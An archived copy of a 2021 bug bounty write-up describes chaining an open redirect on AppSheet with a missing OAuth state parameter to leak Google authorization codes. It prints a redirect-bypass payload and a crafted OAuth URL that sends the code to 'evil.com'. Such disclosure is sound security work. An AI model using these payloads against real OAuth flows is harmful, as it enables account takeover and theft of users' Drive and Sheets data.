---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-04-22_got-nice-catch-by-google.md
original_filename: 2021-04-22_got-nice-catch-by-google.md
title: Got Nice catch by Google
category: documents
detected_topics:
- oauth
- command-injection
- mfa
- otp
- csrf
- api-security
tags:
- imported
- documents
- oauth
- command-injection
- mfa
- otp
- csrf
- api-security
language: en
raw_sha256: fc650d5ba678f7e6f2ddf299fb00f8774f23e941d072b387e09e5debae6fc02a
text_sha256: 6582b5b2e6ec1770dd9d4446a17917195937d61114b930263b87843309931340
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# Got Nice catch by Google

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-04-22_got-nice-catch-by-google.md
- Source Type: markdown
- Detected Topics: oauth, command-injection, mfa, otp, csrf, api-security
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `fc650d5ba678f7e6f2ddf299fb00f8774f23e941d072b387e09e5debae6fc02a`
- Text SHA256: `6582b5b2e6ec1770dd9d4446a17917195937d61114b930263b87843309931340`


## Content

---
title: "Got Nice catch by Google"
url: "https://parthdeshani.medium.com/got-nice-catch-by-google-5e6a8211371c"
authors: ["Parth Desani (@DesaniParth)"]
programs: ["Google"]
bugs: ["OAuth", "Open redirect", "CSRF"]
publication_date: "2021-04-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3714
scraped_via: "browseros"
---

# Got Nice catch by Google

Got Nice catch by Google
Parth Desani
Follow
3 min read
·
Apr 22, 2021

287

3

This is my story of finding multiple bugs in Google’s acquisition chain to increase the severity and get a Nice catch by GOOGLE

Press enter or click to view image in full size

So in 2020 lock-down started and many people started becoming more creative and I have seen lots of people finding more bugs during lock-down therefore I also think of giving another shot on Google as I already submitted many bugs but got duplicate or NA.

I chose a target as Appsheet.com which is google’s intelligent no coding platform it sounds good to me. Because I believe there is an AI there is a bug.

So I started looking bug and I found a link like

https://www.appsheet.com/account/login?retrunUrl=/account

After login, I see this link is redirecting to the user to /account page so I tried simply as

https://www.appsheet.com/account/login?retrunUrl=google.com

but obviously, it won’t work as there are restrictions so I tried many payloads for redirection from below

https://github.com/payloadbox/open-redirect-payload-list#:~:text=Unvalidated%20redirects%20and%20forwards%20are,URL%20contained%20within%20untrusted%20input.

and surprisingly /\/\/google.com worked.

but then I remember mostly Google won’t accept this kind of low-level bugs as I already submitted many silly bugs and google mark them won’t fix.

so for 2–3 days, I leave this target then after and one day I was discussing OAuth CSRF bugs with one of my friend @Pig.wig45 AKA 
Sahil Tikoo
.

Then after immediately went back to appsheet.com and check OAuth related bugs and the good news there is not state parameter define as I’m getting state=?.

Press enter or click to view image in full size
Missing State Parameter

Basically, State parameter is used in Oauth to prevent CSRF attacks.

Get Parth Desani’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

So till now I’m figure out that 2 things.

Open Redirection
Oauth CSRF

Now it’s time to check redirection URL (ru)in Oauth. this is the main part of Oauth 2.0 protocol if an attacker can change this URL it can leverage the user’s authentication token.

But most of the time this redirection URL is protected and in my case also. Therefore, I change the redirection URL with my Open-redirection URL so the final URL looks like this.

https://www.appsheet.com/Account/ELCGD?state=?FullScope=yesru=https%3a%2f%2fwww.appsheet.com%2fAccount?retrunUrl=/\/\/evil.com&code=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&scope=email profile https://www.googleapis.com/auth/userinfo.profile openid https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/spreadsheets https://www.googleapis.com/auth/drive&authuser=1&prompt=consent

And ……..

Then Reported to Google and got nice catch by GOOGLE

Unfortunately, This bug get no bounty as google said acquired assets need atlist 6 month old and I reported on 5th month after google acquired (My bad luck)

Press enter or click to view image in full size

However, I got mentioned in Google’s Honorable Hall of Fame.

Press enter or click to view image in full size
Bughunter
Parth Desani

bughunter.withgoogle.com

Bug Bounty Tips:

Always try to make higher impact and chain multiple bug
Always read carefully about scope Always always always..(Otherwise no bounty)
Never Give up

Remember : “NO GUTS, NO Glory !!!!”
